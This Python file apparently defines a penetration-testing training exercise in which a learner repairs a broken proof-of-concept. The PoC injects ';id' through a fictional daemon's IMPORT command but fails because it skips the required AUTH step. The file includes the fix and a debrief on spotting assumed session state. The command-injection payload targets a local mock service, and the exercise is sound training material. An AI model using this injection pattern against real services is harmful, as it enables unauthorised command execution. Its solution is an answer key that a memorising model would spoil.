"""salvage defect class 4: the exploit assumes state it never establishes.

A proof-of-concept written by someone already holding a session will happily
skip the step that got them one. This is the raw-TCP form of it: a daemon that
wants an authentication line before it will look at anything else, and a
script that opens the socket and starts talking.

This is also the scenario that exercises the raw TCP target, so the two mock
services stay honest against real content rather than only against tests.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python3
# wexler-sync 1.4 - unauthenticated IMPORT command injection
# The daemon speaks a line protocol. Banner, then commands.
import socket

HOST = "127.0.0.1"
PORT = {{PORT}}
TOKEN = "wx-8f21a3c7"

def main():
    s = socket.create_connection((HOST, PORT), timeout=5)
    banner = s.recv(256).decode().strip()
    print("[*] banner: " + banner)

    s.sendall(b"IMPORT /var/lib/wexler/jobs;id\n")
    reply = s.recv(256).decode().strip()
    print("[*] reply: " + reply)
    s.close()
    print("[+] landed" if "CRUX-LANDED" in reply else "[-] no")

if __name__ == "__main__":
    main()
'''

SOLUTION = BROKEN.replace(
    '    s.sendall(b"IMPORT',
    '    s.sendall(("AUTH " + TOKEN + "\\n").encode())\n'
    '    print("[*] auth: " + s.recv(256).decode().strip())\n'
    '    s.sendall(b"IMPORT')

SCENARIOS = [
    Scenario(
        id='salvage-handshake', track='salvage', tier='verified', order=40,
        title='The daemon answers and refuses everything',
        waypoint='svc-db', hone=('python',),
        source='PEN-200 Playbook/05 - Phase 4b - Initial Foothold (Services).md',
        body=SalvageBody(
            brief='`wexler-sync` is a line-oriented daemon: it sends a '
                  'banner, then reads commands one line at a time. Its '
                  '`IMPORT` command runs what follows the path. The '
                  'proof-of-concept connects and gets refused. **You already '
                  'recovered a sync token: `wx-8f21a3c7`.**',
            filename='wexler_sync.py',
            cve='CVE-2015-3306', models='ProFTPD mod_copy',
            real_note=(
                'The ProFTPD mod_copy exploit must send SITE CPFR then SITE '
                'CPTO in order; a PoC that jumps to the copy without the setup '
                'is refused, the same shape as the missing AUTH here.'
            ),
            defects=('skips the AUTH step the daemon requires',),
            kind='tcp',
            banner=b'wexler-sync 1.4 ready\n',
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('an AUTH line', 'raw', 'AUTH wx-8f21a3c7',
                            hint='the daemon never saw an authentication '
                                 'line, so it ignored everything after it'),
                Requirement('an IMPORT line', 'raw', 'IMPORT ',
                            hint='no IMPORT command arrived'),
                Requirement('the injection', 'raw', ';id',
                            hint='the IMPORT path carried no injected '
                                 'command'),
            ),
            debrief='The script was written by somebody who already had an '
                    'authenticated session, so the step that established it '
                    'is not in the file. **Read a proof-of-concept for the '
                    'state it assumes**, not only for the request it sends: '
                    'a login, a cookie, a CSRF token fetched from the form, a '
                    'protocol handshake. The tell here was that the daemon '
                    'answered at all and still refused: a service that talks '
                    'to you and says no is a service you have not '
                    'authenticated to yet.',
        ),
    ),
]
